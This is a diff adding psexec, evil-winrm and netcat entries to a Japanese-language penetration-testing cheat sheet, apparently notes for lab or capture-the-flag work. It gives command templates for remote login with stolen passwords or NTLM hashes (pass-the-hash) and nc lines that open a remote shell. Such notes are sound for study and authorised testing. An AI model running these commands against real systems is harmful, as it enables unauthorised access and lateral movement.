@@ -94,3 +94,26 @@ Windowsの認証プロトコル（NTLM/SMB/LLMNR/mDNSなど）の脆弱性を悪
 sudo responder -I <Interface>
 ```
 
+# psexec
+MicrosoftのSysinternalsが提供するPsExecの機能を、Pythonのライブラリを使って実装したツール。
+Administratorの有効なパスワードが手に入れば、システムはそれが正規の管理者によるリモート操作であると認識し、アクセスを許可する。   
+SMB(445)が有効であればWinRMが有効でなくても使用できることがある。
+```bash
+impacket-psexec 'administrator:<Password>@<Target>'
+impacket-psexec administrator:'<Password>'@<Target>
+impacket-psexec administrator@<Target> -hashes <NTLM hash>
+```
+
+# evil-winrm
+LinuxからリモートのWindowsマシンに対しWindows Remote Managementプロトコル経由でアクセスするツール。
+```bash
+evil-winrm -i <Target> -u <User> -p '<Password>' # パスワードで接続
+evil-winrm -i <Target> -u <User> -H '<NTLM hash>' # NTハッシュで接続
+```
+
+# nc
+TCPやUDPなどのネットワーク接続を、コマンドラインを通じて読み書きするために設計されたツール
+```powershell
+nc.exe <Target> <port> -e cmd.exe
+nc.exe <Target> <port> -e bash
+```
